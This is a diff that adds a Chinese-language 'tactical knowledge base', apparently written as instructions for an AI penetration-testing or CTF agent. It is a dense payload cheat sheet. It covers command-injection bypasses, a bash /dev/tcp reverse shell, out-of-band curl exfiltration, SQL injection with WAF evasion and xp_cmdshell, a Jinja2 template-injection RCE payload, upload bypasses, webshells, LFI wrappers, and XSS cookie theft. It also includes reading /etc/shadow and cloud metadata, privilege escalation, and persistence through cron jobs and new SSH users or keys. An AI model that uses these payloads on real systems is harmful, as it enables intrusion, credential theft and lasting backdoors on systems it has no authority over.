@@ -1,0 +1,92 @@
+### 核心战术知识库 (Tactical Knowledge Base)
+
+**重要**: 以下是高价值的战术参考。你必须根据目标技术栈灵活应用。
+
+#### 通用漏洞利用原则 (General Exploitation Principles)
+1.  **知己知彼**: 在利用前，充分收集目标环境信息（操作系统、中间件版本、WAF 存在与否、网络拓扑）。
+2.  **最小权限**: 优先以最低权限执行操作，逐步尝试提权，避免不必要的破坏。
+3.  **无回显处理**: 对于盲注或无回显漏洞，必须规划好带外通信（Out-of-Band, OOB）或侧信道（Side Channel）来获取结果。
+4.  **漏洞组合**: 思考如何将多个低危漏洞组合成高危利用链（例如：LFI + Log Poisoning -> RCE）。
+5.  **证据留存**: 所有利用结果（尤其是 RCE、数据泄露）必须有明确的证据捕获。
+
+#### 1. 命令注入 (Command Injection)
+- **分隔符**: `;`, `|`, `&&`, `||`, `
+`, `` ` ``, `$()`。考虑 `"` 闭合与 `#` 注释。
+- **空格绕过**: `${IFS}`, `$IFS$9`, `{cat,/etc/passwd}`, `<`, `%09`。
+- **关键字绕过**: 拼接 `ca''t`, 编码 `\x63\x61\x74`, 通配符 `/b?n/c?t`。
+- **无回显**: 使用 DNS/HTTP 带外 (`curl x.com`), 延时 (`sleep`), 或重定向到静态目录。
+- **进阶利用**: 反弹 Shell (`bash -i >& /dev/tcp/IP/PORT 0>&1`)，创建持久化后门。
+
+#### 2. SQL注入 (SQL Injection)
+- **探测**: `'`, `"`, `\`, `' OR 1=1--`。关注报错、布尔差异、时间延迟。
+- **识别**:
+  - **Boolean**: `AND 1=1` vs `AND 1=2`。
+  - **Time**: `SLEEP(5)`, `BENCHMARK()`, `pg_sleep(5)`。
+  - **Error**: 触发 SQL 语法错误或类型转换错误。
+- **WAF绕过**:
+  - **注释**: `/**/`, `/*!50000*/`, `--%0a`, `#`。
+  - **编码**: URL双重编码, Hex, Unicode, `char()`。
+  - **混淆**: `SeLeCt`, `UnIoN`, 空白符替换 (`%09`, `%0a`, `%0b`, `%0c`, `%0d`, `%a0`)。
+- **流程**: 探测 -> 列数 (`ORDER BY`) -> 显示位 (`UNION`) -> 库/表/列 -> 数据。
+- **进阶利用**: 读写文件 (`LOAD_FILE`, `INTO DUMPFILE`), 命令执行 (`xp_cmdshell`, UDF)。
+
+#### 3. 服务器端模板注入 (SSTI)
+{% raw %}
+- **引擎识别 (关键)**:
+  - `{{7*7}}` (49) -> Jinja2/Twig
+  - `${7*7}` (49) -> Freemarker/Java
+  - `<%=7*7%>` (49) -> ERB
+  - `#{7*7}` (49) -> Smarty
+- **沙箱逃逸 (Python/Jinja2)**:
+  - `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`
+  - `{{''.__class__.__mro__[1].__subclasses__()}}` (寻找 `subprocess.Popen` 或 `os`)
+- **盲注**: 盲注时利用时间延迟 (`{% for x in range(10000) %}...{% endfor %}`) 或布尔差异。
+{% endraw %}
+- **进阶利用**: 成功获取 RCE 后，读取 `/etc/passwd`, `/etc/shadow`, 云平台元数据 (`169.254.169.254`)。
+
+#### 4. 文件上传 (File Upload)
+- **扩展名**: `.php5`, `.phtml`, `.php.jpg`, `.PhP`。
+- **内容**: 添加魔术头 `GIF89a;`。
+- **MIME**: 修改 `Content-Type` 为 `image/jpeg`。
+- **竞争**: 在文件被删除前访问执行。
+- **进阶利用**: 成功上传 WebShell 后，尝试连接管理工具（如 AntSword, Cobalt Strike），获取服务器信息。
+
+#### 5. 路径遍历/LFI (Path Traversal)
+- **Payloads**: `../`, `..%2f`, `%2e%2e%2f` (双重编码), `..;/` (Java)。
+- **PHP Wrappers**:
+  - 源码读取: `php://filter/convert.base64-encode/resource=index.php`
+  - RCE: `php://input` (POST data), `data://text/plain;base64,...`
+- **截断**: `%00` (老版本PHP/Java)。
+- **进阶利用**: 读取敏感配置文件（`/etc/passwd`, `/etc/shadow`, 应用配置）。结合日志投毒获取 RCE。
+
+#### 6. 跨站脚本 (XSS)
+- **Context**: HTML (`<script>`), 属性 (`" onx=`), JS (`';`), URL (`javascript:`). 
+- **Payloads**: `<img src=x onerror=alert(1)>`, `<svg onload=alert(1)>`, `javascript:alert(1)`. 
+- **Bypass**: 实体编码 (`&#x3c;`), URL编码, 拼接 (`eval('al'+'ert(1)')`).
+- **进阶利用**: 获取 Cookie (`document.cookie`), 绕过 CSRF, 键盘记录器, 钓鱼。
+
+#### 7. IDOR (越权)
+- **枚举**: 遍历 ID, UUID。
+- **位置**: 检查 URL, Body, Cookie, Headers。
+- **方法**: 替换 HTTP 方法 (GET/POST/PUT/DELETE)。
+- **类型**: 尝试数组参数 `id[]=1`, JSON 类型混淆。
+- **进阶利用**: 批量数据导出, 越权修改用户数据, 配合其他漏洞获取管理权限。
+
+#### 8. 目标产物识别 (Target Artifacts)
+- **常见位置**: 环境变量 (`env`, `printenv`), 配置文件 (`config.php`, `settings.py`), 数据库 (`users` 表), Web根目录, `/tmp`, `/root`, 用户目录。
+- **CTF**: 关注 `flag`, `flag.txt`, `CTF{...}` 格式。
+
+#### 9. 漏洞组合与战果扩大 (Exploit Chaining & Post-Exploitation)
+- **漏洞链思维**:
+    - **信息泄露 + 任意文件读取/写入**: 获取源码 -> 审计源码 -> 发现 RCE 或敏感信息。
+    - **任意文件上传 + LFI**: 上传 Webshell -> LFI 包含 Webshell -> RCE。
+    - **IDOR + XSS**: 越权修改配置 -> 注入 XSS Payload。
+- **提权 (Privilege Escalation)**:
+    - 识别运行进程用户 (`whoami`, `id`)。
+    - 检查 SUID/SGID 程序 (`find / -perm -u=s -type f 2>/dev/null`)。
+    - 寻找配置文件中的敏感信息 (`/etc/shadow`, 数据库连接串)。
+    - 内核漏洞利用。
+- **持久化 (Persistence)**:
+    - 写入 WebShell。
+    - 修改启动项 (`/etc/rc.local`, `crontab -e`)。
+    - 创建新的 SSH 用户或 SSH Key。
